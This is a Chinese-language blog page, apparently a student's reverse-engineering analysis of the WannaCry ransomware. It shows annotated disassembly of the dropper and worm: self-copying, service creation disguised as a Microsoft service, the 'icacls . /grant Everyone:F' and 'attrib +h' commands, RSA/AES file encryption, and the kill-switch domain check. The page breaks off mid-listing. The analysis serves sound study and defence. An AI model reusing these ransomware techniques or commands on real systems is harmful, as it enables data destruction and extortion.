@@ -1,0 +1,392 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>wannaCry-analysis | wd-z711&#39;s B10g</title>
+  <meta name="author" content="wd-z711">
+  
+  <meta name="description" content="Common student in China. Interested in web &amp; re.">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="wannaCry-analysis"/>
+  <meta property="og:site_name" content="wd-z711&#39;s B10g"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'G-YHJSKZDC3Y', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="wd-z711's B10g" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">wd-z711&#39;s B10g</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> wannaCry-analysis</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="wannacry勒索病毒分析"><a href="#wannacry勒索病毒分析" class="headerlink" title="wannacry勒索病毒分析"></a>wannacry勒索病毒分析</h1><p>&emsp;wannacry是一个勒索病毒，使用永恒之蓝进行传播。</p>
+<span id="more"></span>
+<h2 id="taskche-exe"><a href="#taskche-exe" class="headerlink" title="taskche.exe"></a>taskche.exe</h2><p>&emsp;此程序主要负责对磁盘文件加密。</p>
+<p>&emsp;分析winmain函数流程：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line">.text:00401FE7                 push    ebp</span><br><span class="line">.text:00401FE8                 mov     ebp, esp</span><br><span class="line">.text:00401FEA                 sub     esp, 6E4h</span><br><span class="line">.text:00401FF0                 mov     al, byte_40F910</span><br><span class="line">.text:00401FF5                 push    ebx</span><br><span class="line">.text:00401FF6                 push    esi</span><br><span class="line">.text:00401FF7                 push    edi</span><br><span class="line">.text:00401FF8                 mov     [ebp+Filename], al</span><br><span class="line">.text:00401FFE                 mov     ecx, 81h</span><br><span class="line">.text:00402003                 xor     eax, eax</span><br><span class="line">.text:00402005                 lea     edi, [ebp+var_20B]</span><br><span class="line">.text:0040200B                 rep stosd</span><br><span class="line">.text:0040200D                 stosw</span><br><span class="line">.text:0040200F                 stosb                   ; 初始化局部变量</span><br><span class="line">.text:00402010                 lea     eax, [ebp+Filename]</span><br><span class="line">.text:00402016                 push    208h            ; nSize</span><br><span class="line">.text:0040201B                 xor     ebx, ebx</span><br><span class="line">.text:0040201D                 push    eax             ; lpFilename</span><br><span class="line">.text:0040201E                 push    ebx             ; hModule</span><br><span class="line">.text:0040201F                 call    ds:GetModuleFileNameA ; 获取当前进程路径</span><br><span class="line">.text:00402025                 push    offset DisplayName</span><br><span class="line">.text:0040202A                 call    random_string   ; 调用函数产生随机字符串，当做服务名称</span><br><span class="line">.text:0040202F                 pop     ecx</span><br><span class="line">.text:00402030                 call    ds:__p___argc</span><br><span class="line">.text:00402036                 cmp     dword ptr [eax], 2</span><br><span class="line">.text:00402039                 jnz     short loc_40208E</span><br><span class="line">.text:0040203B                 push    offset aI       ; &quot;/i&quot;</span><br><span class="line">.text:00402040                 call    ds:__p___argv</span><br><span class="line">.text:00402046                 mov     eax, [eax]</span><br><span class="line">.text:00402048                 push    dword ptr [eax+4] ; Str1</span><br><span class="line">.text:0040204B                 call    strcmp</span><br><span class="line">.text:00402050                 pop     ecx</span><br><span class="line">.text:00402051                 test    eax, eax</span><br><span class="line">.text:00402053                 pop     ecx</span><br><span class="line">.text:00402054                 jnz     short loc_40208E</span><br><span class="line">.text:00402056                 push    ebx             ; wchar_t *</span><br><span class="line">.text:00402057                 call    sub_401B5F</span><br><span class="line">.text:0040205C                 test    eax, eax</span><br><span class="line">.text:0040205E                 pop     ecx</span><br><span class="line">.text:0040205F                 jz      short loc_40208E</span><br><span class="line">.text:00402061                 mov     esi, offset FileName ; &quot;tasksche.exe&quot;</span><br><span class="line">.text:00402066                 push    ebx             ; bFailIfExists</span><br><span class="line">.text:00402067                 lea     eax, [ebp+Filename]</span><br><span class="line">.text:0040206D                 push    esi             ; lpNewFileName</span><br><span class="line">.text:0040206E                 push    eax             ; lpExistingFileName</span><br><span class="line">.text:0040206F                 call    ds:CopyFileA    ; 拷贝自身副本，命名为tasksche.exe</span><br><span class="line">.text:00402075                 push    esi             ; lpFileName</span><br><span class="line">.text:00402076                 call    ds:GetFileAttributesA</span><br><span class="line">.text:0040207C                 cmp     eax, 0FFFFFFFFh</span><br><span class="line">.text:0040207F                 jz      short loc_40208E</span><br><span class="line">.text:00402081                 call    create_service_mutex ; 创建服务和互斥体防止重复感染</span><br><span class="line">.text:00402086                 test    eax, eax</span><br><span class="line">.text:00402088                 jnz     loc_402165</span><br><span class="line">.text:0040208E</span><br><span class="line">.text:0040208E loc_40208E:                             ; CODE XREF: WinMain(x,x,x,x)+52↑j</span><br><span class="line">.text:0040208E                                         ; WinMain(x,x,x,x)+6D↑j ...</span><br><span class="line">.text:0040208E                 mov     esi, ds:strrchr</span><br><span class="line">.text:00402094                 lea     eax, [ebp+Filename]</span><br><span class="line">.text:0040209A                 push    5Ch ; &#x27;\&#x27;       ; Ch</span><br><span class="line">.text:0040209C                 push    eax             ; Str</span><br><span class="line">.text:0040209D                 call    esi ; strrchr</span><br><span class="line">.text:0040209F                 pop     ecx</span><br><span class="line">.text:004020A0                 test    eax, eax</span><br><span class="line">.text:004020A2                 pop     ecx</span><br><span class="line">.text:004020A3                 jz      short loc_4020B4</span><br><span class="line">.text:004020A5                 lea     eax, [ebp+Filename]</span><br><span class="line">.text:004020AB                 push    5Ch ; &#x27;\&#x27;       ; Ch</span><br><span class="line">.text:004020AD                 push    eax             ; Str</span><br><span class="line">.text:004020AE                 call    esi ; strrchr</span><br><span class="line">.text:004020B0                 pop     ecx</span><br><span class="line">.text:004020B1                 mov     [eax], bl</span><br><span class="line">.text:004020B3                 pop     ecx</span><br><span class="line">.text:004020B4</span><br><span class="line">.text:004020B4 loc_4020B4:                             ; CODE XREF: WinMain(x,x,x,x)+BC↑j</span><br><span class="line">.text:004020B4                 lea     eax, [ebp+Filename]</span><br><span class="line">.text:004020BA                 push    eax             ; lpPathName</span><br><span class="line">.text:004020BB                 call    ds:SetCurrentDirectoryA ; 设置当前工作目录</span><br><span class="line">.text:004020C1                 push    1</span><br><span class="line">.text:004020C3                 call    write_reg       ; 写入当前工作目录到注册表：HKEY_LOCAL_MACHINE\Software\WanaCrypt0r\wd</span><br><span class="line">.text:004020C8                 mov     [esp+6F4h+Str], offset Str ; &quot;WNcry@2ol7&quot;</span><br><span class="line">.text:004020CF                 push    ebx             ; hModule</span><br><span class="line">.text:004020D0                 call    release_files   ; 释放文件到当前工作目录</span><br><span class="line">.text:004020D5                 call    write_cwnry     ; 写入比特币账户到c.wnry</span><br><span class="line">.text:004020DA                 push    ebx             ; lpExitCode</span><br><span class="line">.text:004020DB                 push    ebx             ; dwMilliseconds</span><br><span class="line">.text:004020DC                 push    offset CommandLine ; &quot;attrib +h .&quot;</span><br><span class="line">.text:004020E1                 call    exce_cmd        ; 执行命令行，隐藏所有文件</span><br><span class="line">.text:004020E6                 push    ebx             ; lpExitCode</span><br><span class="line">.text:004020E7                 push    ebx             ; dwMilliseconds</span><br><span class="line">.text:004020E8                 push    offset aIcaclsGrantEve ; &quot;icacls . /grant Everyone:F /T /C /Q&quot;</span><br><span class="line">.text:004020ED                 call    exce_cmd        ; 执行命令行，创建Everyone账户</span><br><span class="line">.text:004020F2                 add     esp, 20h</span><br><span class="line">.text:004020F5                 call    get_api_address</span><br><span class="line">.text:004020FA                 test    eax, eax</span><br><span class="line">.text:004020FC                 jz      short loc_402165</span><br><span class="line">.text:004020FE                 lea     ecx, [ebp+var_6E4]</span><br><span class="line">.text:00402104                 call    Construct       ; 调用构造函数，初始化临界区</span><br><span class="line">.text:00402109                 push    ebx             ; int</span><br><span class="line">.text:0040210A                 push    ebx             ; int</span><br><span class="line">.text:0040210B                 push    ebx             ; lpFileName</span><br><span class="line">.text:0040210C                 lea     ecx, [ebp+var_6E4]</span><br><span class="line">.text:00402112                 call    importkey_and_alloc ; 导入rsa秘钥,并申请0x100000内存空间</span><br><span class="line">.text:00402117                 test    eax, eax</span><br><span class="line">.text:00402119                 jz      short loc_40215A</span><br><span class="line">.text:0040211B                 lea     eax, [ebp+var_4]</span><br><span class="line">.text:0040211E                 lea     ecx, [ebp+var_6E4]</span><br><span class="line">.text:00402124                 push    eax             ; int</span><br><span class="line">.text:00402125                 push    offset aTWnry   ; &quot;t.wnry&quot;</span><br><span class="line">.text:0040212A                 mov     [ebp+var_4], ebx</span><br><span class="line">.text:0040212D                 call    dcrypt_twnry    ; 解密t.wnry文件</span><br><span class="line">.text:00402132                 cmp     eax, ebx</span><br><span class="line">.text:00402134                 jz      short loc_40215A</span><br><span class="line">.text:00402136                 push    [ebp+var_4]     ; int</span><br><span class="line">.text:00402139                 push    eax             ; Src</span><br><span class="line">.text:0040213A                 call    load_dll        ; 解密文件并加载到内存</span><br><span class="line">.text:0040213F                 pop     ecx</span><br><span class="line">.text:00402140                 cmp     eax, ebx        ; 返回值为dll内存地址</span><br><span class="line">.text:00402142                 pop     ecx</span><br><span class="line">.text:00402143                 jz      short loc_40215A</span><br><span class="line">.text:00402145                 push    offset Str1     ; &quot;TaskStart&quot;</span><br><span class="line">.text:0040214A                 push    eax             ; int</span><br><span class="line">.text:0040214B                 call    get_proc_address ; 遍历导出表获取导出函数TaskStart地址</span><br><span class="line">.text:00402150                 pop     ecx</span><br><span class="line">.text:00402151                 cmp     eax, ebx</span><br><span class="line">.text:00402153                 pop     ecx</span><br><span class="line">.text:00402154                 jz      short loc_40215A</span><br><span class="line">.text:00402156                 push    ebx</span><br><span class="line">.text:00402157                 push    ebx</span><br><span class="line">.text:00402158                 call    eax             ; 调用TaskStart导出函数</span><br><span class="line">.text:0040215A</span><br><span class="line">.text:0040215A loc_40215A:                             ; CODE XREF: WinMain(x,x,x,x)+132↑j</span><br><span class="line">.text:0040215A                                         ; WinMain(x,x,x,x)+14D↑j ...</span><br><span class="line">.text:0040215A                 lea     ecx, [ebp+var_6E4]</span><br><span class="line">.text:00402160                 call    destruct        ; 调用析构函数，释放资源</span><br><span class="line">.text:00402165</span><br><span class="line">.text:00402165 loc_402165:                             ; CODE XREF: WinMain(x,x,x,x)+A1↑j</span><br><span class="line">.text:00402165                                         ; WinMain(x,x,x,x)+115↑j</span><br><span class="line">.text:00402165                 pop     edi</span><br><span class="line">.text:00402166                 pop     esi</span><br><span class="line">.text:00402167                 xor     eax, eax</span><br><span class="line">.text:00402169                 pop     ebx</span><br><span class="line">.text:0040216A                 leave</span><br><span class="line">.text:0040216B                 retn    10h</span><br><span class="line">.text:0040216B _WinMain@16     endp</span><br></pre></td></tr></table></figure>
+<p>&emsp;总结一下，初始化流程为：</p>
+<p>Step1：复制自身副本，命名为tasksche.exe，创建服务与互斥体，防止重复感染。</p>
+<p>Step2：设置当前工作目录。</p>
+<p>Step3：将当前工作目录写入注册表。</p>
+<p>Step4：释放资源文件到当前工作目录，并将勒索的比特币账户写入<code>c.wnry</code>。</p>
+<p>Step5：执行<code>attrb +h</code>命令，隐藏所有文件。</p>
+<p>Step6：执行<code>icacls ./grant Everyone:F /T /C /Q</code>命令，创建Everyone账户。</p>
+<p>Step7：导入rsa密钥并申请0x100000内存。</p>
+<p>Step8：解密<code>t.wnry</code>文件，并将解密后的文件加载到内存。遍历导出表获取导出函数<code>TaskStart</code>的地址并调用，启动病毒核心代码。</p>
+<p>&emsp;其中，<code>release_files</code>函数会产生多种资源文件，包括<code>b.wnry</code>（图片资源）、<code>c.wnry</code>（比特币账户）、<code>r.wnry</code>（勒索文档）、<code>s.wnry</code>（用于组建tor网络）、<code>t.wnry</code>（病毒核心代码dll）、<code>u.wnry</code>（解密器）、<code>taskse.exe</code>（提权）、<code>taskdl.exe</code>（删除临时文件与回收站的文件）。</p>
+<p>&emsp;而<code>write_cwnry</code>函数，则是从3个比特币账户中随机挑选一个并写入<code>c.wnry</code>文件。<code>get_api_address</code>则是动态获取文件相关的API函数，例如<code>CreateFileW</code>、<code>WriteFile</code>等，并在其中调用<code>get_advapi32_address</code>来加载<code>advapi32.dll</code>，获取加密算法相关的API。</p>
+<p>&emsp;其中，<code>importkey_and_alloc</code>函数用于导入RSA密钥，并在<code>dcrypt_twnry</code>函数中解密核心代码。而<code>load_dll</code>函数则是解析刚才解密的核心代码，将解密的代码加载入堆空间。</p>
+<p>&emsp;之后，病毒开始真正运行，其流程为：</p>
+<p>（1）创建<code>00000000.pky</code>写入RSA公钥、<code>00000000.eky</code>写入私钥、<code>00000000.res</code>写入随机数与当前时间，用于加密文件。</p>
+<p>（2）遍历磁盘所有文件并加密。加密流程为：</p>
+<p>&emsp;&emsp;（a）导入病毒公钥1，生成公钥2保存到<code>00000000.pky</code>与私钥2，将私钥2使用公钥1加密并保存到<code>00000000.eky</code>。</p>
+<p>&emsp;&emsp;（b）遍历每一个文件，生成密钥3，并加密文件数据。使用公钥2加密密钥3，并将加密的AES密钥写入到被加密的文件中。</p>
+<h2 id="mssecsvc-exe蠕虫"><a href="#mssecsvc-exe蠕虫" class="headerlink" title="mssecsvc.exe蠕虫"></a>mssecsvc.exe蠕虫</h2><p>&emsp;有了taskche.exe，我们还需要用蠕虫将此程序分发到受害者主机上。蠕虫无需计算机使用者干预即可独立运行，其通过获取网络中存在的漏洞进行传播。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">.text:00408140                 sub     esp, 50h</span><br><span class="line">.text:00408143                 push    esi</span><br><span class="line">.text:00408144                 push    edi</span><br><span class="line">.text:00408145                 mov     ecx, 0Eh</span><br><span class="line">.text:0040814A                 mov     esi, offset aHttpWwwIuqerfs ; &quot;http://www.iuqerfsodp9ifjaposdfjhgosuri&quot;...</span><br><span class="line">.text:0040814F                 lea     edi, [esp+58h+szUrl]</span><br><span class="line">.text:00408153                 xor     eax, eax</span><br><span class="line">.text:00408155                 rep movsd</span><br><span class="line">.text:00408157                 movsb</span><br><span class="line">.text:00408158                 mov     [esp+58h+var_17], eax</span><br><span class="line">.text:0040815C                 mov     [esp+58h+var_13], eax</span><br><span class="line">.text:00408160                 mov     [esp+58h+var_F], eax</span><br><span class="line">.text:00408164                 mov     [esp+58h+var_B], eax</span><br><span class="line">.text:00408168                 mov     [esp+58h+var_7], eax</span><br><span class="line">.text:0040816C                 mov     [esp+58h+var_3], ax</span><br><span class="line">.text:00408171                 push    eax             ; dwFlags</span><br><span class="line">.text:00408172                 push    eax             ; lpszProxyBypass</span><br><span class="line">.text:00408173                 push    eax             ; lpszProxy</span><br><span class="line">.text:00408174                 push    1               ; dwAccessType</span><br><span class="line">.text:00408176                 push    eax             ; lpszAgent</span><br><span class="line">.text:00408177                 mov     [esp+6Ch+var_1], al</span><br><span class="line">.text:0040817B                 call    ds:InternetOpenA</span><br><span class="line">.text:00408181                 push    0               ; dwContext</span><br><span class="line">.text:00408183                 push    84000000h       ; dwFlags</span><br><span class="line">.text:00408188                 push    0               ; dwHeadersLength</span><br><span class="line">.text:0040818A                 lea     ecx, [esp+64h+szUrl]</span><br><span class="line">.text:0040818E                 mov     esi, eax</span><br><span class="line">.text:00408190                 push    0               ; lpszHeaders</span><br><span class="line">.text:00408192                 push    ecx             ; lpszUrl</span><br><span class="line">.text:00408193                 push    esi             ; hInternet</span><br><span class="line">.text:00408194                 call    ds:InternetOpenUrlA ; 访问域名，访问成功放弃病毒感染</span><br><span class="line">.text:0040819A                 mov     edi, eax</span><br><span class="line">.text:0040819C                 push    esi             ; hInternet</span><br><span class="line">.text:0040819D                 mov     esi, ds:InternetCloseHandle</span><br><span class="line">.text:004081A3                 test    edi, edi</span><br><span class="line">.text:004081A5                 jnz     short loc_4081BC</span><br><span class="line">.text:004081A7                 call    esi ; InternetCloseHandle</span><br><span class="line">.text:004081A9                 push    0               ; hInternet</span><br><span class="line">.text:004081AB                 call    esi ; InternetCloseHandle</span><br><span class="line">.text:004081AD                 call    being</span><br><span class="line">.text:004081B2                 pop     edi</span><br><span class="line">.text:004081B3                 xor     eax, eax</span><br><span class="line">.text:004081B5                 pop     esi</span><br><span class="line">.text:004081B6                 add     esp, 50h</span><br><span class="line">.text:004081B9                 retn    10h</span><br><span class="line">.text:004081BC ; ---------------------------------------------------------------------------</span><br><span class="line">.text:004081BC</span><br><span class="line">.text:004081BC loc_4081BC:                             ; CODE XREF: WinMain(x,x,x,x)+65↑j</span><br><span class="line">.text:004081BC                 call    esi ; InternetCloseHandle</span><br><span class="line">.text:004081BE                 push    edi             ; hInternet</span><br><span class="line">.text:004081BF                 call    esi ; InternetCloseHandle</span><br><span class="line">.text:004081C1                 pop     edi</span><br><span class="line">.text:004081C2                 xor     eax, eax</span><br><span class="line">.text:004081C4                 pop     esi</span><br><span class="line">.text:004081C5                 add     esp, 50h</span><br><span class="line">.text:004081C8                 retn    10h</span><br><span class="line">.text:004081C8 _WinMain@16     endp</span><br></pre></td></tr></table></figure>
+<p>&emsp;如上所示，病毒访问<code>http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com</code>，若访问成功，则放弃感染（说明已经感染）。在<code>being</code>函数中判断命令参数数量，若小于2，则调用<code>create_and_start_service</code>，否则启动<code>mssecsvc2.0</code>服务。</p>
+<p>&emsp;先看<code>create_and_start_service</code>函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">// create_and_start_service</span><br><span class="line">.text:00407F20 create_and_start_service proc near      ; CODE XREF: being+20↓p</span><br><span class="line">.text:00407F20                 call    create_service</span><br><span class="line">.text:00407F25                 call    release_file    ; 释放病毒勒索程序tasksche.exe</span><br><span class="line">.text:00407F2A                 xor     eax, eax</span><br><span class="line">.text:00407F2C                 retn</span><br><span class="line">.text:00407F2C create_and_start_service endp</span><br><span class="line"></span><br><span class="line">// create_service</span><br><span class="line">.text:00407C40 create_service  proc near               ; CODE XREF: create_and_start_service↓p</span><br><span class="line">.text:00407C40</span><br><span class="line">.text:00407C40 Dest            = byte ptr -104h</span><br><span class="line">.text:00407C40</span><br><span class="line">.text:00407C40                 sub     esp, 104h</span><br><span class="line">.text:00407C46                 lea     eax, [esp+104h+Dest]</span><br><span class="line">.text:00407C4A                 push    edi</span><br><span class="line">.text:00407C4B                 push    offset FileName</span><br><span class="line">.text:00407C50                 push    offset Format   ; &quot;%s -m security&quot;</span><br><span class="line">.text:00407C55                 push    eax             ; Dest</span><br><span class="line">.text:00407C56                 call    ds:sprintf      ; 格式化服务参数</span><br><span class="line">.text:00407C5C                 add     esp, 0Ch</span><br><span class="line">.text:00407C5F                 push    0F003Fh         ; dwDesiredAccess</span><br><span class="line">.text:00407C64                 push    0               ; lpDatabaseName</span><br><span class="line">.text:00407C66                 push    0               ; lpMachineName</span><br><span class="line">.text:00407C68                 call    ds:OpenSCManagerA ; 打开服务管理器</span><br><span class="line">.text:00407C6E                 mov     edi, eax</span><br><span class="line">.text:00407C70                 test    edi, edi</span><br><span class="line">.text:00407C72                 jz      short loc_407CCA</span><br><span class="line">.text:00407C74                 push    ebx</span><br><span class="line">.text:00407C75                 push    esi</span><br><span class="line">.text:00407C76                 push    0               ; lpPassword</span><br><span class="line">.text:00407C78                 push    0               ; lpServiceStartName</span><br><span class="line">.text:00407C7A                 push    0               ; lpDependencies</span><br><span class="line">.text:00407C7C                 push    0               ; lpdwTagId</span><br><span class="line">.text:00407C7E                 lea     ecx, [esp+120h+Dest]</span><br><span class="line">.text:00407C82                 push    0               ; lpLoadOrderGroup</span><br><span class="line">.text:00407C84                 push    ecx             ; lpBinaryPathName</span><br><span class="line">.text:00407C85                 push    1               ; dwErrorControl</span><br><span class="line">.text:00407C87                 push    2               ; dwStartType</span><br><span class="line">.text:00407C89                 push    10h             ; dwServiceType</span><br><span class="line">.text:00407C8B                 push    0F01FFh         ; dwDesiredAccess</span><br><span class="line">.text:00407C90                 push    offset DisplayName ; &quot;Microsoft Security Center (2.0) Service&quot;</span><br><span class="line">.text:00407C95                 push    offset ServiceName ; &quot;mssecsvc2.0&quot;</span><br><span class="line">.text:00407C9A                 push    edi             ; hSCManager</span><br><span class="line">.text:00407C9B                 call    ds:CreateServiceA ; 创建&quot;mssecsvc2.0&quot;服务</span><br><span class="line">.text:00407CA1                 mov     ebx, ds:CloseServiceHandle</span><br><span class="line">.text:00407CA7                 mov     esi, eax</span><br><span class="line">.text:00407CA9                 test    esi, esi</span><br><span class="line">.text:00407CAB                 jz      short loc_407CBB</span><br><span class="line">.text:00407CAD                 push    0               ; lpServiceArgVectors</span><br><span class="line">.text:00407CAF                 push    0               ; dwNumServiceArgs</span><br><span class="line">.text:00407CB1                 push    esi             ; hService</span><br><span class="line">.text:00407CB2                 call    ds:StartServiceA ; 启动服务</span><br><span class="line">.text:00407CB8                 push    esi             ; hSCObject</span><br><span class="line">.text:00407CB9                 call    ebx ; CloseServiceHandle ; 关闭服务句柄</span><br><span class="line">.text:00407CBB</span><br><span class="line">.text:00407CBB loc_407CBB:                             ; CODE XREF: create_service+6B↑j</span><br><span class="line">.text:00407CBB                 push    edi             ; hSCObject</span><br><span class="line">.text:00407CBC                 call    ebx ; CloseServiceHandle ; 关闭服务句柄</span><br><span class="line">.text:00407CBE                 pop     esi</span><br><span 